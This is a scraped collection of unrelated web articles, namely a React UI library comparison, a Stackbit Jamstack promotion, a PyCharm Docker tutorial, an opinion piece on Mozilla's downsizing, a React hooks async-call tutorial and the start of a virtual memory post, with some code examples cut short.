<li>The Bootstrap library that you know and love, with React bindings</li>
<li>Easily customised via CSS-in-JS</li>
<li>It’s been around long enough with widespread usage that bugs/issues aren’t a worry</li>
<li>Quick to get started</li>
<li>No jQuery dependency as it’s been reimplemented entirely in React</li>
</ul>
<p>Cons:</p>
<ul>
<li>It’s Bootstrap: your site will look like everyone elses if you don’t customise it</li>
</ul>

<p>Bulma is different to most libraries presented here because it’s purely a CSS framework, no JS required. You can choose to either use the classes from Bulma directly, or use a wrapper library such as <code>react-bulma-components</code>.</p>
<p>Project links:</p>
<ul>
<li><a href="https://bulma.io/">Bulma</a></li>
<li>
<p><a href="https://github.com/couds/react-bulma-components">react-bulma-components</a></p>
<ul>
<li>Bundle Size (from <a href="https://bundlephobia.com/result?p=react-bulma-components@3.4.0">BundlePhobia</a>): 179kB minified, 20.1kB minified + gzipped</li>
</ul>
</li>
</ul>
<p>Pros:</p>
<ul>
<li>Doesn’t have the Bootstrap look and feel</li>
<li>Good for getting something up and running quickly</li>
<li>Modern features (Flexbox/Grid under the hood)</li>
</ul>
<p>Cons:</p>
<ul>
<li>Accessibility: there’s some, but doesn’t follow WCAG guidelines as strongly as other libraries</li>
</ul>

<p>Material UI is one of those libraries that I love to hate. It has helped me get through some extremely tight deadlines for clients in the past, but I always end up removing it in favour of almost anything else as soon as possible.</p>
<p>In the past you could only customise Material UI’s styles by writing <a href="https://cssinjs.org/?v=v10.3.0#jss-example">JSS</a>, but thankfully it’s now <a href="https://material-ui.com/guides/interoperability/#styled-components">possible to override styles</a> with styled-components and Emotion.</p>

</ul>
<p>Pros:</p>
<ul>
<li>Comprehensive documentation</li>
<li>Icon library is <a href="https://material-ui.com/components/material-icons/">massive</a></li>
<li>Simple to use (at first)</li>
</ul>
<p>Cons:</p>
<ul>
<li>Customisation is difficult, and painful, yet necessary (to improve visuals)</li>
<li>Performance: known to render excessive DOM nodes</li>
<li>Your app will look like Google made it (which could be a pro, for some people)</li>

<p>In making this list, I’ve attempted to avoid corporate design systems, however some (Material UI) have achieved such widespread adoption that this list would be incomplete without them.</p>
<p>I’ve also intentionally left out CSS-in-JS such as <a href="https://styled-components.com/">styled-components</a> and <a href="https://emotion.sh/docs/introduction">Emotion</a>, and utility CSS systems such as <a href="https://tailwindcss.com/">Tailwind</a>, as they are not explicitly “React Component libraries”, but rather tools with which to make your components.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div id="page"><main id="content"><article><div><p><img src="https://www.stackbit.com/images/jamstack-site-minutes.png" alt="How to Create a Jamstack Website in Minutes!"></p><div><p>The Stackbit Site Builder created a CMS connected Jamstack site with just a few clicks and in just minutes. Let's explore how.</p><p>At Stackbit, we believe that the Jamstack can help make a better web for everyone because Jamstack sites are fast and secure. We want to make it easy for any developer to adopt the Jamstack for their next project. That's why one of the foundational elements that has defined Stackbit since day one has been the ability to generate a Jamstack site with just a few clicks. The basic steps are:</p><h2>1. Choose a theme</h2><p>We currently have eight themes to choose from, including our new, highly customizable theme called <a href="https://themes.stackbit.com/demos/starter/">Starter</a>. Plus, there are dozens of community themes available on GitHub, such as the popular <a href="https://github.com/snipcart/stackbit-theme-planty">Planty ecommerce theme</a> by Snipcart, or even more on <a href="https://jamstackthemes.dev/">JamstackThemes.dev</a>. You also have the ability to import a custom theme of your own (for details on how to configure that, you can <a href="https://docs.stackbit.com/site-builder/custom-themes/">check the docs</a>)</p><h2>2. Choose a static site generator (SSG)</h2><p>All of our themes can be generaed using Gatsby, Hugo or Jekyll (with additional support coming <em>very</em> soon...but I won't spoil the surprise). This gives you options to choose the tool and language you prefer to use for developing your Jamstack site. (Not sure which one to choose? <a href="https://www.stackbit.com/blog/choosing-your-ssg/">We have some advice here</a>.)</p><h2>3. Choose a headless content management system (CMS)</h2><p>One of the powerful things about buildng a site through the Stackbit site builder is that it is pre-configured for content management through your choice of <a href="https://www.stackbit.com/blog/what-is-a-headless-cms/">headless CMS</a>, including Sanity, Contentful, DataCMS, Forestry and NetilfyCMS. We've even added a new option for using files in your GitHub repository that can still get the full inline content editing features in Stackbit. (More on that in an upcoming post!)</p><p>One you've made these three choices, you are ready to go. Stackbit will build the site, place the source in GitHub and deploy to Netlify. Within minutes your site is ready and deployed!</p><p>Let's be honest though, telling you about this is far less exciting than simply showing you...so let's see what this looks like in action.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/d1Xlr4L44KE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><h2>Make the site your own</h2><p>The really important thing you should know about your new Jamstack site is that <strong>the code is yours.</strong> The code ends up in a GitHub respository you own. You can edit and customize it as you wish. In fact, we've made it easy to get your site running on your local machine and start editing by providing the instructions in the project's <code>README.md</code> or via Stackbit's online editor. This gives you the ability to do things like:</p><ul><li><a href="https://www.stackbit.com/blog/stackbit-gatsby-site-improvements/">Add a favicon, analytics, social sharing and a sitemap</a></li><li><a href="https://www.stackbit.com/blog/gatsby-search/">Add site search using Algolia</a></li><li><a href="https://www.stackbit.com/blog/jamstack-gatsby-mailchimp/">Add a mailing list form that connects to Mailchimp</a></li><li><a href="https://www.stackbit.com/blog/complete-guide-netlify-forms/">Customize how your form submissions are handled</a></li></ul><p>...and anything else you can think of!</p><p>The best part is that everything I have described to you here is also available at no cost. Just head on over to the <a href="https://app.stackbit.com/create">Stackbit Site Builder</a> and start creating your Jamstack site!</p></div></div></article></main></div></div></div></div>]]>

While we have relied on Jupyter notebooks for setting up our code, this time we’re going to use an IDE. We will be using PyCharm Professional as the demonstrative example, however the corresponding functionalities also appear to be made available through the Python plugin of IDEA Ultimate Edition.</p><p id="73f0"><strong><em>NOTE</em></strong><em>: Unfortunately, most features required for this tutorial, including setting up a Docker-based Python interpreter, and the Scientific view functionalities, are restricted to the paid-for versions of the software. Know of any popular IDEs with equivalent features? Please let us know in the comments!</em></p><p id="a0d4">For starters, let’s run the New Project action. For the project category, we’ll be going with “Scientific”. The tricky part is defining the interpreter. On project creation, we select the system one, and <strong>not</strong> a remote one. This is because, for some reason, PyCharm will not let us create a project with a Docker interpreter outright (perhaps because Docker interpreter support is a relatively new feature).</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1556/1*vq8PDBwcEU4fQg5Xj5cYbw.png" width="778" height="487" srcset="https://miro.medium.com/max/552/1*vq8PDBwcEU4fQg5Xj5cYbw.png 276w, https://miro.medium.com/max/1104/1*vq8PDBwcEU4fQg5Xj5cYbw.png 552w, https://miro.medium.com/max/1280/1*vq8PDBwcEU4fQg5Xj5cYbw.png 640w, https://miro.medium.com/max/1400/1*vq8PDBwcEU4fQg5Xj5cYbw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*vq8PDBwcEU4fQg5Xj5cYbw.png?q=20"></p></div></div></div></figure><p id="7afa">We will subsequently be greeted with a new project window. <strong>Now</strong> we can define the final interpreter.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2096/1*UF9IdPLSboS5Das3morvfQ.png" width="1048" height="729" srcset="https://miro.medium.com/max/552/1*UF9IdPLSboS5Das3morvfQ.png 276w, https://miro.medium.com/max/1104/1*UF9IdPLSboS5Das3morvfQ.png 552w, https://miro.medium.com/max/1280/1*UF9IdPLSboS5Das3morvfQ.png 640w, https://miro.medium.com/max/1400/1*UF9IdPLSboS5Das3morvfQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*UF9IdPLSboS5Das3morvfQ.png?q=20"></p></div></div></div></figure><p id="2227">Once there, select <code>Docker</code>, and the desired image from the ones present in your local Docker image store.

The project is now ready to run.</p><p id="331d">We are again going to be using the <a href="https://www.tensorflow.org/datasets/keras_example" target="_blank" rel="noopener">MNIST tutorial</a> as a base.</p><p id="4df8">First up, open <code>main.py</code>, which should be generated during project setup. Let’s fire up the GPU setup code:</p><figure><div></div></figure><p id="ae18">Note the <code>#%%</code> - this is a marker for a new code cell, similarly as in Jupyter.</p><p id="5f52">You’ll notice that apart from the logging, the defined variables appear on the right-hand side of the Python console, available for inspection.</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2154/1*ATkKK30SIcBXhzoC5g6q9w.png" width="1077" height="708" srcset="https://miro.medium.com/max/552/1*ATkKK30SIcBXhzoC5g6q9w.png 276w, https://miro.medium.com/max/1104/1*ATkKK30SIcBXhzoC5g6q9w.png 552w, https://miro.medium.com/max/1280/1*ATkKK30SIcBXhzoC5g6q9w.png 640w, https://miro.medium.com/max/1400/1*ATkKK30SIcBXhzoC5g6q9w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ATkKK30SIcBXhzoC5g6q9w.png?q=20"></p></div></div></div></figure><p id="430d">Let’s follow the tutorial in the subsequent cells:</p><figure><div></div></figure><p id="65d2">As before, you should witness the training-per-epoch output.</p><p id="8112">Finally, let us take an advantage of PyCharm’s <a href="https://www.jetbrains.com/pycharm/features/scientific_tools.html" target="_blank" rel="noopener">Scientific mode</a>, and do some graph plotting. Specifically, let’s plot the training parameters available in the <code>History</code> object:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/744/1*JK28wf4b7wHUkY6VxrkQ-w.png" width="372" height="204" srcset="https://miro.medium.com/max/552/1*JK28wf4b7wHUkY6VxrkQ-w.png 276w, https://miro.medium.com/max/744/1*JK28wf4b7wHUkY6VxrkQ-w.png 372w" sizes="372px" data-old-src="https://miro.medium.com/max/60/1*JK28wf4b7wHUkY6VxrkQ-w.png?q=20"></p></div></div></figure><p id="99c9">Unfortunately, if we’d try it without any prep, we would immediately hit a snag — JetBrains’ software has <a href="https://youtrack.jetbrains.com/issue/PY-32668" target="_blank" rel="noopener">several</a> <a href="https://youtrack.jetbrains.com/issue/PY-27489" target="_blank" rel="noopener">outstanding</a> <a href="https://youtrack.jetbrains.com/issue/PY-33558" target="_blank" rel="noopener">issues</a> that prevent the operation of the plotting functionality without workarounds.</p><p id="3d70">As it is evident from the bug reports, the core issue is a lack of connectivity between the IDE and <code>matplotlib</code>. Normally, we would solve this problem by using appropriate initialization arguments for the Docker container, but there does not appear to be a way to do that in the remote interpreter settings.</p><p id="293d">What we <em>can</em> do, however, is to create a Docker Compose file, with a sufficient workaround:</p><figure><div></div></figure><p id="2614">Next, we set up a Docker Compose remote interpreter like so:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1742/1*afp7RMPWlq-ZtB0YcBNHsw.png" width="871" height="574" srcset="https://miro.medium.com/max/552/1*afp7RMPWlq-ZtB0YcBNHsw.png 276w, https://miro.medium.com/max/1104/1*afp7RMPWlq-ZtB0YcBNHsw.png 552w, https://miro.medium.com/max/1280/1*afp7RMPWlq-ZtB0YcBNHsw.png 640w, https://miro.medium.com/max/1400/1*afp7RMPWlq-ZtB0YcBNHsw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*afp7RMPWlq-ZtB0YcBNHsw.png?q=20"></p></div></div></div></figure><p id="3ae5">Now we wait for the indexing to finish, restart the Python console, and add one more code cell:</p><figure><div></div></figure><p id="34b0">and we should end up with a corresponding graph on the Plots view pane:</p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1690/1*Io2TEghkXsp_gRyPpTVD_g.png" width="845" height="781" srcset="https://miro.medium.com/max/552/1*Io2TEghkXsp_gRyPpTVD_g.png 276w, https://miro.medium.com/max/1104/1*Io2TEghkXsp_gRyPpTVD_g.png 552w, https://miro.medium.com/max/1280/1*Io2TEghkXsp_gRyPpTVD_g.png 640w, https://miro.medium.com/max/1400/1*Io2TEghkXsp_gRyPpTVD_g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*Io2TEghkXsp_gRyPpTVD_g.png?q=20"></p></div></div></div></figure><p id="980a">We have built upon the <a target="_blank" rel="noopener" href="https://sml.io/setting-up-tensorflow-with-gpu-acceleration-the-quick-way-add80cd5c988">previous blog entry</a>, trading a reliance on Jupyter for a traditional IDE. We have thus gained features such as an arguably improved code completion and documentation access, as well as, potentially, an augmented sense of familiarity with the tools being used.</p><p id="c545">As is apparent from our little demo, remote interpreter support is still in the process of being fully integrated into the tooling. Nevertheless, it already works relatively well. As a fallback, it’s always possible to have two projects — one for data analysis and preprocessing (using a local interpreter), and one for training (using a remote interpreter).</p><p id="a905">Nevertheless, do take a look at PyCharm’s <a href="https://www.jetbrains.com/pycharm/features/scientific_tools.html" target="_blank" rel="noopener">feature set</a> and the associated <a href="https://www.jetbrains.com/help/pycharm/matplotlib-tutorial.html" target="_blank" rel="noopener">tutorial</a> for more information.</p></div></div></section></div></div>]]>

<p><i>Disclaimer: I’m not a current or former Mozilla employee and have no other affiliation with Mozilla.</i> This is my own analysis of the publically-available information surrounding Mozilla’s decision to <a href="https://blog.mozilla.org/blog/2020/08/11/changing-world-changing-mozilla/">radically downsize</a> in a way that seems to further threaten Firefox’s future.

</p><p>A lot of people are very angry at Mozilla’s management for their decision to restructure the foundation, which is <a href="https://twitter.com/withoutboats/status/1217558588857544704">not unreasonable.</a> But seen in context, I think most people would, if in their position, make the same decision.

</p><p>Why is Mozilla cutting staff on its most popular product (Firefox) and refocusing on things that look like unsuccessful stunt projects? <a href="https://medium.com/swlh/could-google-crush-firefox-in-2020-13a55b5d4526">Because they’re about to lose the revenue from it.</a> <em>Google</em> is to blame for not renewing the contract that gives Mozilla a share of the ad revenue from the Firefox search bar. The web browser market has been walking on thin ice since 2008 when Chrome came out, because with Chrome available and under its own control, Google no longer had a reason to support the ecosystem with revenue-sharing deals. Now it seems like Google wants to see just how thin it can make the ice before Mozilla goes under.

</p><p>And why are they focussing on products nobody uses? Because they can make money by selling VPN subscriptions and premium bookmarking accounts without depending on the (obviously limited) goodwill of their competitors.

</p><p>What can you do about this? Here are some suggestions:

</p><ul>
  <li><strong>Buy one of Mozilla’s other products.</strong> It might seem like validating the bad decision made by Mozilla management, but it is reasonable to hope that income from, say, Mozilla VPN might be enough to keep a rag-tag Firefox team going.
  </li><li><strong>Just straight up <a href="https://donate.mozilla.org/">donate to Mozilla.</a></strong> Remember, Mozilla is a non-profit organization. While Google is developing Chrome to strengthen its bottom line and pay out more to shareholders, Mozilla’s interest in the Web platform is actually public-spirited. They fought against DRM in HTML and the mandatory use of patent-encumbered technologies on the open web, and when these efforts failed (largely for the same reasons Google is now able to crush Firefox entirely) they adopted laudable compromises, giving their users a genuine choice about using these technologies. And more than that&nbsp;—&nbsp;they’re actively participating in projects to create new, widely-supported and superior alternatives to these problematic technologies for the future. The web would be a worse place without Mozilla, and for that they deserve your goodwill.
  </li><li><strong>Write to your lawmaker urging an investigation into Google’s anti-competitive practices</strong> in the web browser and web markup space. This could be particularly effective if you live in the EU and write to your European Parliamentarians. Google is probably counting on the Trump administration not caring about their blatant repeat of Microsoft’s anti-trust violations&nbsp;— but other major jurisdictions which still have functioning regulatory systems can make a difference.
  </li><li><strong>Actually use Firefox, or one of its derivatives like the Tor Browser.</strong> One reason Google feels able to do this is probably because of Firefox’s shrinking market share. But Firefox is a vital part of the browser ecosystem, not least as the only major browser left that isn’t based on a WebKit-derivative engine, and as a hackable open-source browser that’s a vital component of equally-vital privacy projects like Tor. And Firefox still has really great features, especially for web developers. Switch back to Firefox&nbsp;— especially if you’re on Chrome!
  </li><li><strong>Switch away from Google products as much as possible.</strong> I know that other web search engines are still embarrassingly bad&nbsp;—&nbsp;I’m not here to guilt-trip anyone into using DuckDuckGo. But if you use Gmail, stop. There are <a href="https://www.fastmail.com/">fantastic</a> <a href="https://protonmail.com/">alternatives</a> out there which, yes, filter spam just as well as Gmail does these days. Use Apple Maps or OpenStreetMap or Yelp instead of Google Maps. Run an ad blocker that blocks YouTube ads, and support your favourite YouTubers directly over Patreon instead.
</li></ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
Doing asynchronous calls using React hooks is not straightforward.
One has to know how correctly write a functional component and also comply to the <a href="https://reactjs.org/docs/hooks-rules.html">Rules of hooks</a>.</p>
<p>In this post we discover various challenges doing asynchronous calls when using functional components.
We then build our own custom hooks, one which triggers the asynchronous calls when the component is mounted and one that triggers the call imperatively (e.g. when a button is clicked).</p>
<blockquote>
<p>With “asynchronous function” or “asynchronous call” we mean any javascript function, which triggers a side effect and returns a standard javascript <code>Promise</code>. At some point, the promise will either be resolved (on success) or be rejected (if an error occurs). If the promise is not yet resolved or rejected, it is in the loading state.</p>
</blockquote>
<blockquote>
<p>In our examples we use the <code>fetch</code> function, but the asynchronous function could be any function which returns a promise.</p>
</blockquote>
<h2>Naive approach</h2>
<p>One could just trigger the asynchronous call directly in the render method:</p>
<div data-language="jsx"><pre><code><span>import</span> React<span>,</span> <span>{</span> useState <span>}</span> <span>from</span> <span>"react"</span>

<span>export</span> <span>default</span> <span>function</span> <span>Example</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>result<span>,</span> setResult<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>isLoading<span>,</span> setIsLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>true</span><span>)</span>

<span>  <span>const</span> <span>doCall</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>fetch</span><span>(</span><span>"/api/users"</span><span>)</span><span>.</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> r<span>.</span><span>text</span><span>(</span><span>)</span><span>)</span></span>
<span>  <span>doCall</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span></span><span>    <span>r</span> <span>=&gt;</span> <span>{</span></span><span>      <span>setIsLoading</span><span>(</span><span>false</span><span>)</span></span><span>      <span>setResult</span><span>(</span>r<span>)</span></span><span>    <span>}</span><span>,</span></span><span>    <span>e</span> <span>=&gt;</span> <span>{</span></span><span>      <span>setIsLoading</span><span>(</span><span>false</span><span>)</span></span><span>      <span>setError</span><span>(</span>e<span>)</span></span><span>    <span>}</span></span><span>  <span>)</span></span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span></span><span>&gt;</span></span><span></span>
<span>      </span><span>{</span>isLoading <span>&amp;&amp;</span> <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>Loading data...</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span><span></span>
<span>      </span><span>{</span>error <span>&amp;&amp;</span> <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>An error occurred</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span><span></span>
<span>      </span><span>{</span>result <span>&amp;&amp;</span> <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>{</span>result<span>}</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>}</span><span></span>
<span>    </span><span><span><span>&lt;/</span></span><span>&gt;</span></span>
  <span>)</span>
<span>}</span></code></pre></div>
<p>In the example above we directly trigger the call inside the body of the render function.
Remember, when using a functional component, as we do, the function body itself is the render method (we directly return the components to be rendered).</p>
<p>One problem in this example is, that it is not allowed to do side effects directly inside the body of the render method. Quoting the React documentation:</p>
<blockquote>
<p>All React components must act like pure functions with respect to their props.</p>
</blockquote>
<p>Additionally, a cleanup when the component unmounts is not happening. Imagine, the promise returned by the <code>doCall</code> function takes 10 seconds to resolve and in the meantime, the component is unmounted. The function <code>setResult</code> is still called, which could possibly lead to memory leaks.</p>
<p>When the promise is resolved and the component is already unmounted, we would get a warning like <em>“Warning: Can’t perform a React state update on an unmounted component. This is a no-op, but it indicates a memory leak in your application. To fix, cancel all subscriptions and asynchronous tasks in a useEffect cleanup function.”</em></p>
<p>One last problem is, that the call is executed every time the component is re-rendered, which could happen anytime.</p>
<p>So how can we do better?</p>
<h2>Using the effect hook</h2>
<p>The right way to do side effects in a functional component is to use the <code>useEffect</code> hook.
We need to pass the (wrapped) asynchronous function as the first argument to the <code>useEffect</code> hook:</p>
<div data-language="jsx"><pre><code><span>import</span> React<span>,</span> <span>{</span> useEffect<span>,</span> useState <span>}</span> <span>from</span> <span>"react"</span>

<span>export</span> <span>default</span> <span>function</span> <span>Example</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>result<span>,</span> setResult<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>isLoading<span>,</span> setIsLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>true</span><span>)</span>

<span>  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span></span>    <span>const</span> <span>doCall</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>fetch</span><span>(</span><span>"/api/users"</span><span>)</span><span>.</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> r<span>.</span><span>text</span><span>(</span><span>)</span><span>)</span>

    <span>doCall</span><span>(</span><span>)</span><span>.</span><span>then</span><span>(</span>
      <span>r</span> <span>=&gt;</span> <span>{</span>
        <span>setIsLoading</span><span>(</span><span>false</span><span>)</span>
        <span>setResult</span><span>(</span>r<span>)</span>
      <span>}</span><span>,</span>
      <span>e</span> <span>=&gt;</span> <span>{</span>
        <span>setIsLoading</span><span>(</span><span>false</span><span>)</span>
        <span>setError</span><span>(</span>e<span>)</span>
      <span>}</span>
    <span>)</span>
  <span>}</span><span>)</span>

  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span></span><span>&gt;</span></span><span></span>
<span>      </span><span>{</span>isLoading <span>&amp;&amp;</span> <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>Loading data...</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span><span></span>
<span>      </span><span>{</span>error <span>&amp;&amp;</span> <span><span><span>&lt;</span>p</span><span>&gt;</span></span><span>An error occurred</span><span><span><span>&lt;/</span>p</span><span>&gt;</span></span><span>}</span><span></span>
<span>      </span><span>{</span>result <span>&amp;&amp;</span> <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>{</span>result<span>}</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>}</span><span></span>
<span>    </span><span><span><span>&lt;/</span></span><span>&gt;</span></span>
  <span>)</span>
<span>}</span></code></pre></div>
<p>When using the <code>useEffect</code> hook we are doing side effects the correct way.</p>
<p>By default, the function passed to the <code>useEffect</code> hook is called for every rerender, which would cause our call to be executed for every props or state change, which we in our example certainly do not want.</p>
<p>To control this behaviour, we can pass a second argument to the <code>useEffect</code> hook, which is an array which defines the dependencies of the passed function.
When some value inside the dependency array changes, the effect is re-executed.</p>
<p>When passing an empty array, which effectively means, the effect has no dependencies, then the passed function is only executed once when the component is mounted.
This is the behaviour we want in our example.</p>
<div data-language="jsx"><pre><code><span>import</span> React<span>,</span> <span>{</span> useEffect<span>,</span> useState <span>}</span> <span>from</span> <span>"react"</span>

<span>export</span> <span>default</span> <span>function</span> <span>Example</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>result<span>,</span> setResult<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>)</span>
  <span>const</span> <span>[</span>isLoading<span>,</span> setIsLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>true</span><span>)</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
      <span>const</span> <span>doCall</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>fetch</span><span>(</span><span>"/api/users"</span><span>)</span><span>.</span><span>then</span><span>(</span><span>r</span> <span>=&gt;</span> r<span>.</span><span>text</span><span>(</span><span>)</span><span>)</span>

  <span>)</span>
<span>}</span></code></pre></div>
<p>When the asynchronous call is dependent on some value and we want to re-trigger the call based on when some state changes or when property passed to the component changes, we explicitly need to add it to the dependencies array.</p>
<p>Imagine, we have a component which displays a user based on the passed user id, we need to pass the <code>userId</code> value as a dependency:</p>
<div data-language="jsx"><pre><code><span>import</span> React<span>,</span> <span>{</span> useEffect<span>,</span> useState <span>}</span> <span>from</span> <span>"react"</span>

  <span>)</span>
<span>}</span></code></pre></div>
<p>When using the <code>useEffect</code> hook, we solved the issue with the prohibited side effects in the render method.
However when using calls with dependencies (e.g. like in the example above), we actually introduced a new problem:
When the effect is re-triggered and our asynchronous function is called again, we now have a race condition.</p>
<p>Imagine, the component is rendered as <code>&lt;ShowUser userId={1} /&gt;</code>. When the component is mounted, the call to load user 1 is triggered as expected.
Now the component’s <code>userId</code> property changes: <code>&lt;ShowUser userId={2} /&gt;</code>. The component is then re-rendered with the changed property.
Subsequently also the effect is re-executed and the call to load user 2 is triggered.
Everything works as expected unless in some (possibly) rare cases, the first call takes longer to resolve than the second call. What would happen in this case, first the <code>setResult(&lt;user 2&gt;)</code> is called, and after the first call finally is resolved <code>setResult(&lt;user 1&gt;)</code>. This in turn would then certainly display the wrong user.</p>
<p>Remember, one additional challenge in the naive approach was, that there was no cleanup function, which could lead to problems, when the component is unmounted.</p>
<p>We can solve both problems using a cleanup function inside the effect.
In the function passed to the <code>useEffect</code> hook, we can return a callback function, which is executed when the effect is cleaned up. This cleanup happens each time the dependency array changes and at the very end, i.e. when the component is unmounted.</p>
<p>In our simple example, we just want to ignore the results after cleanup when the promise is resolved or rejected.</p>
<blockquote>
<p>If the API would support it, we could also, for example, cancel the fetch in the cleanup callback, effectively avoiding doing unnecessary work after the effect is cleaned up.</p>

<p>As we see in the example above, the discussed race condition cannot happen anymore, because the cleanup function is called when the dependencies (in our case the <code>userId</code>) change, and the result is then ignored when the promise is resolved or rejected.</p>
<h2>Creating our own custom hook</h2>
<p>Since we do have to take care for a lot of things to do for one asynchronous call, we can create our own custom hook, which abstracts the details of doing the calls the right way away.</p>
<p>A custom hook is a function which itself calls other hooks. Of course must also comply to the rules of hooks.</p>
<p>In our custom hook, the caller needs to have access to the loading and result states (<code>result</code>, <code>error</code>, <code>isLoading</code>) and of course we need to pass the asynchronous function to be triggered to the hook (including the dependencies of the call).
Everything else can be abstracted away.
Inside the hook we can just use the <code>useEffect</code> hook with the same ideas as in the examples above.</p>
<p>To pass the state and result variables we use the array deconstruction syntax, which is also used by the other built-in hooks, so we return everything the caller needs to know in one array.</p>

  <article>

    

    <section>
      <p>I’ve been planning for some time to make a post about things you can do with <a href="https://en.wikipedia.org/wiki/Virtual_memory">virtual memory</a>, so when <a href="https://twitter.com/jimsagevid">@jimsagevid</a> <a href="https://twitter.com/jimsagevid/status/920351713529344003">tweeted</a> me about virtual memory in response to my last post, I felt the time was right.</p>



<p>Virtual memory is funny. As programmers, we <em>know</em> that it’s there (on all modern CPUs and OSs), but we tend to forget about it, perhaps because it’s not directly exposed in our programming languages. Or, we just think of it as the thing that makes our software run really slow instead of crashing, when it runs out of physical RAM.</p>

<p>But, it turns out, if you actually make use of what virtual memory can do, you can achieve some pretty cool things.</p>

<h2 id="obscenely-big-array">Obscenely big array</h2>

<p>To recap — in my <a href="https://ourmachinery.com/post/multi-threading-the-truth/">last post</a> I faced the problem of wanting a big lookup table from object IDs to object pointers. Furthermore, I wanted this table to stay fixed in memory, so that writers could atomically replace pointers in the table without disturbing readers. This means that using something like a <code>std::vector</code> is not possible, since the underlying data will be reallocated when the vector grows.</p>

<p>A fixed array works:</p>

<pre><code>object_o *objects[MAX_OBJECTS].
</code></pre>

<p>But what size should we use for the array? Pick a big size, and we’re wasting memory. Pick a small size, and we might run out of objects. In the article, I used a hierarchical approach, but as <a href="https://twitter.com/jimsagevid">@jimsagevid</a> pointed out, we could use virtual memory instead, and avoid the complexity of a hierarchical table layout.</p>

<p>When we allocate memory through the virtual memory system we reserve address space for the pages we allocate immediately (no other code can allocate memory in that address range), but actual physical memory is not allocated until we actually touch the pages.</p>

<p>So for this situation, we can just pick a comfortably large number for our array and virtually allocate it. Say <em>1 billion</em> of objects, for example:</p>

<pre><code>#define MAX_OBJECTS 1000000000ULL
object_o **objects = virtual_alloc(MAX_OBJECTS * sizeof(object_o *));
</code></pre>

<p>We’re using 8 GB of address space and virtual memory, but only as much physical memory as we actually need for our objects. A simple solution that only requires one line of code.</p>

<p>Note: I’m using <code>virtual_alloc()</code> here as my OS agnostic virtual memory allocation call. On Windows you would actually call <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;ved=0ahUKEwjE__aguZ7XAhUNwGMKHWPIDkAQFgguMAE&amp;url=https%3A%2F%2Fmsdn.microsoft.com%2Fen-us%2Flibrary%2Fwindows%2Fdesktop%2Faa366887(v%3Dvs.85).aspx&amp;usg=AOvVaw3EQf1l0Ifuh9GKCNmSmO6x">VirtualAlloc()</a> and on Linux <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap()</a>.</p>

